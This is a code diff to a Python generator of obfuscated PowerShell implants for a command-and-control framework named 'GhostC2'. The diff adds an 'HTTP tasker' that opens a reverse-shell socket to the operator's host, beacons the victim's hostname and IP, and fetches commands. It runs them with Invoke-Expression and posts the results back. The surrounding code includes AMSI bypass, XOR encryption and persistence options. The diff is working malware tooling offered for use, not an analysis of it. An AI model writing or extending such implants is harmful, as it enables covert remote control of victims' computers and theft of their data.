@@ -56,6 +56,47 @@ function XOR($data,$key=0x5A){
     return [System.Text.Encoding]::ASCII.GetString($b);
 }
 """
+def get_http_tasker(host, port=8080):
+    return f"""
+Start-Job -ScriptBlock {{
+    $stream = $null
+    try {{
+        $client = New-Object System.Net.Sockets.TCPClient("{host}",1443)
+        $stream = $client.GetStream()
+    }} catch {{}}
+
+    while ($true) {{
+        try {{
+            $hostname = $env:COMPUTERNAME
+            $ip = (Invoke-RestMethod -Uri "http://ifconfig.me")
+            $payload = "ps_reverse"
+
+            $resp = Invoke-RestMethod -Uri "http://{host}:{port}/beacon" -Method Post -Body @{{hostname=$hostname;ip=$ip;payload=$payload}} | ConvertTo-Json -Depth 3
+            $tasks = ($resp | ConvertFrom-Json).tasks
+
+            foreach ($cmd in $tasks) {{
+                $out = Invoke-Expression $cmd | Out-String
+
+                # Write to reverse shell
+                if ($stream) {{
+                    try {{
+                        $send = "[GhostC2] Command: $cmd`n$out`n"
+                        $bytes = [System.Text.Encoding]::ASCII.GetBytes($send)
+                        $stream.Write($bytes, 0, $bytes.Length)
+                        $stream.Flush()
+                    }} catch {{}}
+                }}
+
+                # Send result back to GhostC2
+                $body = @{{hostname=$hostname;command=$cmd;result=$out;payload=$payload}} | ConvertTo-Json -Depth 3
+                Invoke-RestMethod -Uri "http://{host}:{port}/result" -Method Post -Body $body -ContentType "application/json"
+            }}
+        }} catch {{}}
+        Start-Sleep -Seconds 10
+    }}
+}} | Out-Null
+"""
+
 
 def generate_obfuscated_ps(
     host="localhost",
@@ -64,12 +105,17 @@ def generate_obfuscated_ps(
     persistence="none",
     auto_recon=False,
     xor_encrypt=False,
-    write_file=True
+    write_file=True,
+    http_tasker=False,  # ⬅️ new flag
+    http_port=8080
 ):
     parts = []
 
     # AMSI bypass
     parts.append(get_amsi_bypass(amsi_bypass))
+
+    if http_tasker:
+        parts.append(get_http_tasker(host, http_port))
 
     # Persistence (optional)
     if persistence != "none":
